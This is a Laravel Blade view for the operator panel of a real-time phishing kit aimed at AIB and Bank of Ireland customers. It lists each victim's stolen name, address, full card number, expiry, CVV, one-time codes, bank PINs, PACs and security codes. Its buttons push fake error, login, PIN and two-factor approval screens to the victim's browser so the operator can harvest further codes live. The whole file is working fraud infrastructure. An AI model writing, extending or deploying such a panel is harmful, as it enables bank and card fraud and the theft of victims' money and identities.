@extends('admin.layout')
@section('main')
@php
    $interval =  now()->subMinutes(5);
@endphp
<h1 class="text-uppercase">[
    @if ($session->last_active >= $interval)
    <span class="text text-success">online</span>
@else
    <span class="text text-secondary">offline</span>
@endif
 | {{$session->ip}} | {{$session->id}} | {{str_replace('/', '', $session->status)}}
    ]</h1>
<hr>
<div>
    <h5>Actions: </h5>
    <a href="{{ route('admin.session.action', ['session' => $session->id, 'action' => 'screenshot']) }}" class="btn btn-info">Screenshot</a>
    <a href="{{ route('admin.session.action', ['session' => $session->id, 'action' => 'error']) }}" class="btn btn-danger mb-3">CC Error</a>
    <a href="{{ route('admin.session.action', ['session' => $session->id, 'action' => 'error']) }}" class="btn btn-danger mb-3">OTP Error</a>
    <a href="{{ route('admin.session.action', ['session' => $session->id, 'action' => 'error']) }}" class="btn btn-danger mb-3">AIB Error</a>
    <a href="{{ route('admin.session.action', ['session' => $session->id, 'action' => 'error']) }}" class="btn btn-danger mb-3">AIB OTP Error</a>
    <a href="{{ route('admin.session.action', ['session' => $session->id, 'action' => 'error']) }}" class="btn btn-danger mb-3">BOI Error</a>
    <a href="{{ route('admin.session.action', ['session' => $session->id, 'action' => 'error']) }}" class="btn btn-danger mb-3">BOI PIN Error</a>
    <a href="{{ route('admin.session.action', ['session' => $session->id, 'action' => 'error']) }}" class="btn btn-danger mb-3">BOI Security Code Error </a>
</div>
<hr>
<div>
    <h5>Screens: </h5>
    <a href="{{ route('admin.session.action', ['session' => $session->id, 'action' => 'otp']) }}" class="btn btn-primary mb-3">OTP Screen</a>
    <a href="{{ route('admin.session.action', ['session' => $session->id, 'action' => 'aib']) }}" class="btn btn-primary mb-3">AIB Login Screen</a>
    <a href="{{ route('admin.session.action', ['session' => $session->id, 'action' => 'aib_otp']) }}" class="btn btn-primary mb-3">AIB OTP Screen</a>
    <a href="{{ route('admin.session.action', ['session' => $session->id, 'action' => 'boi']) }}" class="btn btn-primary mb-3">BOI Login Screen</a>
    <a href="{{ route('admin.session.action', ['session' => $session->id, 'action' => 'boi_pin']) }}" class="btn btn-primary mb-3">BOI PIN Screen</a>
    <a href="{{ route('admin.session.action', ['session' => $session->id, 'action' => 'boi_approve']) }}" class="btn btn-primary mb-3">BOI 2 Factor Approve</a>
    <a href="{{ route('admin.session.action', ['session' => $session->id, 'action' => 'boi_allow_notification']) }}" class="btn btn-primary mb-3">BOI Allow Notification</a>
    <a href="{{ route('admin.session.action', ['session' => $session->id, 'action' => 'boi_approve']) }}" class="btn btn-primary mb-3">BOI Allow Permission</a>
    <a href="{{ route('admin.session.action', ['session' => $session->id, 'action' => 'boi_security_code']) }}" class="btn btn-primary mb-3">BOI 2 Security Code</a>
    <a href="{{ route('admin.session.action', ['session' => $session->id, 'action' => 'bye']) }}" class="btn btn-primary mb-3">Completed Screen</a>
</div>
<hr>

<div class="alert alert-info"> This page auto refresh every 10 seconds </div>

<div class="alert alert-light">
    User: 
        @if ($session->last_active >= $interval)
        <span class="text text-success">Online</span>
    @else
        <span class="text text-">Offline</span>
    @endif
     | User page:  {{str_replace('/', '', $session->status)}} | IP: {{$session->ip}} | Screenshot: {{$session->screenshot == null ? 'Not Available' : 'Available'}}
</div>
<div class="row" >
    <h3></h3>
    <div class="col-md-5">
    
        <div class="card border-dark mb-3" style="">
            <div class="card-header">User Info</div>
            <div class="card-body text-dark">
                <p class="card-text">Name: {{$session->full_name}}</p>
                <p class="card-text">Email: {{$session->email}}</p>
                <p class="card-text">Phone: {{$session->phone_number}}</p>
                <p class="card-text">Postcode: {{$session->postcode}}</p>
                <p class="card-text">Address: {{$session->address}}</p>
            </div>
        </div>
        <hr>
        <div class="card border-dark mb-3" style="">
            <div class="card-header">BOI Info</div>
            <div class="card-body text-dark">
                <p class="card-text">User ID: {{$session->boi_user_id}}</p>
                <p class="card-text"> Date of Birth): {{$session->boi_dob}}</p>
                <p class="card-text">PIN: {{$session->boi_pin}}</p>
                <p class="card-text">Security Code: {{$session->boi_security_code}}</p>
            </div>
        </div>
        <hr>
        <div class="card border-dark mb-3" style="">
            <div class="card-header">Screenshot</div>
            <div class="card-body text-dark">
           <a href="{{$session->screenshot}}" target="blank">
            <img src="{{$session->screenshot}}" class="img-fluid rounded" alt="">
           </a>
            </div>
        </div>
       
        {{-- <hr> --}}
    </div>


    <div class="col-md-5">

        <div class="card border-dark mb-3" style="">
            <div class="card-header">Credit Card Info</div>
            <div class="card-body text-dark">
                <p class="card-text">Name: {{$session->c_name}}</p>
                <p class="card-text">Card Number: {{$session->c_number}}</p>
                <p class="card-text">Expiry Date: {{$session->c_exp}}</p>
                <p class="card-text">CVV: {{$session->c_cvv}}</p>
                <p class="card-text">OTP: {{$session->otp}}</p>
            </div>
        </div>
        <hr>
        <div class="card border-dark mb-3" style="">
            <div class="card-header">AIB Info</div>
            <div class="card-body text-dark">
                <p class="card-text">Registration number: {{$session->aib_number}}</p>
                <p class="card-text"> Personal Access Code (PAC): {{$session->aib_pac}}</p>
                <p class="card-text">OTP: {{$session->aib_otp}}</p>
            </div>
        </div>
        <hr>
        <div class="card border-dark mb-3" style="">
            <div class="card-header">Basic Info</div>
            <div class="card-body text-dark">
                <p class="card-text">IP: {{$session->ip}}</p>
                <p class="card-text">User Agent: {{$session->useragent}}</p>
                <p class="card-text">Session Started: {{$session->created_at->diffForHumans() }}</p>
                <p class="card-text">Session Last Update: {{$session->updated_at->diffForHumans() }}</p>

            </div>
        </div>
        
       
    </div>
</div>

@endsection


@section('js')
    <script>
        setInterval(async () => {
            $("#autoRefresh").load(location.href+" #autoRefresh>*","");
        }, 10000);
    </script>
@endsection